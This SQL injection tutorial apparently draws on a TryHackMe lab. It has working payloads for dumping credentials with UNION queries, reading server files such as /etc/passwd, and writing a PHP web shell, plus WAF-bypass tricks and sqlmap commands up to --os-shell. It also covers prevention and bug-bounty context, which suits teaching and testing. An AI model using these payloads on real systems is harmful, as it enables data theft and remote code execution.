

---

**What is SQL Injection?**

The point at which a web application using SQL can become vulnerable to SQL Injection is when user-supplied data is included in the SQL query.

Consider the following scenario: you come across a blog online, and each blog entry has a unique ID number. Blog entries may be set to public or private depending on whether they are ready for public release. The URL for each blog entry might look like:

```
https://website.thm/blog?id=1
```

The web application needs to retrieve the article from the database and may use an SQL statement like:
```sql
SELECT * from blog where id=1 and private=0 LIMIT 1;
```

This searches the blog table for an article with ID 1 where the private column is set to 0 (publicly viewable), limiting results to one match.

---

**Exploiting the Vulnerability:**

Suppose article ID 2 is still set as private. We can call:
```
https://website.thm/blog?id=2;--
```

Which produces:
```sql
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```

The semicolon ends the SQL statement, and the `--` causes everything after it to be treated as a comment — effectively running:
```sql
SELECT * from blog where id=2;
```
This returns article 2 **regardless** of whether it is public or private.

---

**Types of SQL Injection:**

| Type | Description |
|---|---|
| **In-Band** | Results returned directly on the same page |
| **Blind** | No direct output — true/false or time-based |
| **Out-of-Band** | Data extracted via DNS/HTTP to external server |

---

**In-Band SQL Injection**

The easiest type to detect and exploit. "In-Band" means the same communication channel is used both to exploit the vulnerability and to receive results.

**Two subtypes:**

**1. Error-Based SQL Injection**
Database error messages are printed directly to the browser screen, revealing database structure information. Triggered by injecting characters like `'` or `"`:

```
https://website.thm/blog?id=1'
```
If you see a SQL syntax error → the site is vulnerable ✅

**2. Union-Based SQL Injection**
Uses the `UNION` SQL operator combined with `SELECT` to return additional results. The most common method to extract large amounts of data.

---

**Step-by-Step Union-Based Attack:**

**Step 1 — Find the number of columns:**
```sql
1 UNION SELECT 1        → error (wrong number of columns)
1 UNION SELECT 1,2      → error
1 UNION SELECT 1,2,3    → success ✅ (3 columns confirmed)
```

**Step 2 — Make the original query return no results:**
Change the ID to 0 so only our injected UNION data shows:
```sql
0 UNION SELECT 1,2,3
```

**Step 3 — Get the database name:**
```sql
0 UNION SELECT 1,2,database()
```
Result: `sqli_one`

**Step 4 — List all tables:**
```sql
0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema = 'sqli_one'
```
Result: `article`, `staff_users`

**Step 5 — Get column names from target table:**
```sql
0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name = 'staff_users'
```
Result: `id`, `password`, `username`

**Step 6 — Dump usernames and passwords:**
```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') 
FROM staff_users
```
This returns all usernames and passwords separated by `:` with each result on a new line using HTML `<br>` tags for readability.

---

**Additional Details & Advanced Techniques**

**Error-Based Extraction (MySQL):**
```sql
-- Extract data through error messages
' AND extractvalue(1,concat(0x7e,database())) --
' AND updatexml(1,concat(0x7e,database()),1) --
' AND (SELECT 1 FROM(SELECT COUNT(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

**Full Enumeration Cheat Sheet:**
```sql
-- Current database user
0 UNION SELECT 1,2,user()

-- Database version
0 UNION SELECT 1,2,version()

-- All databases
0 UNION SELECT 1,2,group_concat(schema_name) 
FROM information_schema.schemata

-- All tables in a database
0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema='target_db'

-- All columns in a table
0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name='target_table'

-- Dump all data
0 UNION SELECT 1,2,group_concat(username,0x3a,password) 
FROM users
```

**Reading Files from the Server (if permissions allow):**
```sql
0 UNION SELECT 1,2,load_file('/etc/passwd')
0 UNION SELECT 1,2,load_file('/var/www/html/config.php')
```

**Writing Files to the Server:**
```sql
0 UNION SELECT 1,2,"<?php system($_GET['cmd']); ?>" 
INTO OUTFILE '/var/www/html/shell.php'
```
This writes a **web shell** — giving you remote code execution! 🔴

---

**Finding Injectable Parameters:**

Always test these locations:
```
URL parameters:     ?id=1'
Form fields:        username=' or '1'='1
HTTP Headers:       User-Agent, Referer, X-Forwarded-For
Cookies:            session=1' OR '1'='1
JSON body:          {"id": "1'"}
```

**Quick Detection Payloads:**
```sql
'                   → syntax error
''                  → no error (quote escaped = not injectable)
1 AND 1=1           → true (same result as normal)
1 AND 1=2           → false (different result = injectable!)
1 ORDER BY 1        → no error
1 ORDER BY 100      → error (reveals number of columns)
```

---

**Bypassing WAF (Web Application Firewall):**
```sql
-- Case variation
SeLeCt * FrOm users

-- Comments as spaces
SELECT/**/username/**/FROM/**/users

-- URL encoding
%27 = '   %20 = space   %23 = #

-- Double encoding
%2527 = '

-- Using backticks
SELECT `username` FROM `users`

-- Hex encoding
0x61646d696e = 'admin'
```

---

**Automating with SQLMap:**
```bash
# Basic scan
sqlmap -u "https://website.thm/blog?id=1" --dbs

# Dump specific database
sqlmap -u "https://website.thm/blog?id=1" -D sqli_one --tables

# Dump specific table
sqlmap -u "https://website.thm/blog?id=1" -D sqli_one -T staff_users --dump

# Test all parameters
sqlmap -u "https://website.thm/blog?id=1" --level=5 --risk=3

# From Burp Suite request file
sqlmap -r request.txt --dbs --batch

# Get OS shell (if possible)
sqlmap -u "https://website.thm/blog?id=1" --os-shell
```

---

**Prevention:**
```php
// ❌ Vulnerable
$query = "SELECT * FROM blog WHERE id=" . $_GET['id'];

// ✅ Safe — Prepared Statement
$stmt = $pdo->prepare("SELECT * FROM blog WHERE id = ?");
$stmt->execute([$_GET['id']]);

// ✅ Safe — Named Parameters
$stmt = $pdo->prepare("SELECT * FROM blog WHERE id = :id");
$stmt->execute(['id' => $_GET['id']]);
```

Other defenses:
- Use an **ORM** (Eloquent, SQLAlchemy, Hibernate)
- **Input validation** — reject unexpected characters
- **Least privilege** — DB user should only have SELECT access if that's all it needs
- Disable **detailed error messages** in production
- Use a **WAF** (ModSecurity, Cloudflare)
- Regular **penetration testing** and code reviews

---

**Bug Bounty Impact Scale:**

| Finding | Severity | Payout Range |
|---|---|---|
| SQLi → Read any data | Critical 🔴 | $1,000–$50,000+ |
| SQLi → Auth bypass | Critical 🔴 | $5,000–$30,000+ |
| SQLi → File read | Critical 🔴 | $5,000–$40,000+ |
| SQLi → RCE via file write | Critical 🔴 | $10,000–$100,000+ |

SQL Injection remains one of the **most critical and highest-rewarded** vulnerabilities in the entire bug bounty world! 💰🔥
